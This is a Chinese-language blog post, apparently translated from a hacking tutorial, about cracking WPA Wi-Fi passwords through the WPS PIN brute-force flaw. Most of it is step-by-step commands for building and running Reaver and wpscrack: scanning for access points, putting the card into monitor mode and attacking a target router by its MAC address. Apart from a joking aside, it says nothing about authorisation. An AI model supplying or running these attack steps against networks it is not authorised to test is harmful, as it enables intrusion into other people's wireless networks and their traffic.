---
layout: post
title: "通过破解WPS PIN Hack WPA WIFI密码"
date: 2017-11-26
excerpt: "破解WPA"
translation: ture
tags:
- Wi-Fi hacking
comments: true
---

WPS或者说WiFi Protected Setup（WiFi保护设置）的一个漏洞已经被TNS（译者注：一家安全公司）发现了一年多了，最终开发并验证出了利用代码。TNS，漏洞发现者和.braindump的Stefan都开发了他们各自的“reaver”和“wpscrack”程序来利用WPS的漏洞。 从这个漏洞攻击中，一旦接入点WPS的攻击启动，通常需要2-10个小时（取决于你使用哪个程序，）WPA密码几乎可以立即以明文方式恢复。

这种攻击通过对静态WPS PIN进行智能暴力破解来攻破WPS。通过猜测PIN码，路由器实际上会返回，无论前四位（8位）是否正确。然后，最终数是用于满足算法的检查数。这可以被用来暴力破解WPS PIN，并可以在非常短的时间内恢复WPA密码，而不是在WPA标准里攻击。

在这篇文章中，让我们来看看如何使用这两个工具来破解WPS。到目前为止，还没有路由器可以安全地抵御这种攻击，但是没有任何厂商已经做出响应，以及发布固件或采取缓解措施。即使禁用WPS，也会在大多数路由器上实现这种攻击。

## 要求

- 一台计算机（或一台虚拟机）运行了Kali Linux OS。如果你是一个初学者的话，可以买一个我们的[Kali Pi](https://null-byte.wonderhowto.com/how-to/set-up-headless-raspberry-pi-hacking-platform-running-kali-linux-0176182/)，运行在35美元的Raspberry Pi上（译者注：广告...）
- 一台运行WPS的路由器
- 一个可以在监听模式下进行包注入的无线网卡（译者注：又是一段广告...省略了）
- 下列软件（以软件包名安装）：aircrack-ng, python-pycryptopp, python-scapy, libpcap-dev

## 工具

- [Reaver](http://reaver-wps.googlecode.com/files/reaver-1.3.tar.gz)（支持所有路由器）
- [wpscrack](dl.dropbox.com/u/22108808/wpscrack.zip) （快，但是只支持主要品牌的路由器）

## 破解WPS

按照下面选择使用的工具对应的指南进行操作。

### Reaver

1.解压 Reaver

	unzip reaver-1.3.tar.gz

2.改变Reaver地址

	cd reaver-1.3

3.配置，编译和安装应用程序

	./configure && make && sudo make install

4.扫描一个AP并复制它的MAC地址备用

	sudo iwlist scan wlan0

5.设置你的设备为监听模式

	sudo airmon-ng start wlan0

6.运行工具攻击AP

	reaver -i mon0 -b <MA:CA:DD:RE:SS:XX> -vv

7.等，直到完成

这个工具会让这变得很简单

## wpscrack.py

1.使程序可执行

	chmod +x wpscrack.py

2.扫描一个AP并复制它的MAC地址备用

	sudo iwlist scan wlan0

3.获取你的MAC地址备用

	ip link show wlan0 | awk '/ether/ {print $2}'

4.设置你的设备为监听模式

	sudo airmon-ng start wlan0

5.攻击你的AP

	wpscrack.py –iface mon0 –client <your MAC, because you're attacking yourself, right?> –bssid <AP MAC address> --ssid <name of your AP> -v

6.等待胜利

现在，让我们相信在不久的将来我们可以看到大量固件的更新，不然在这个世界会有很多地方陷入麻烦。


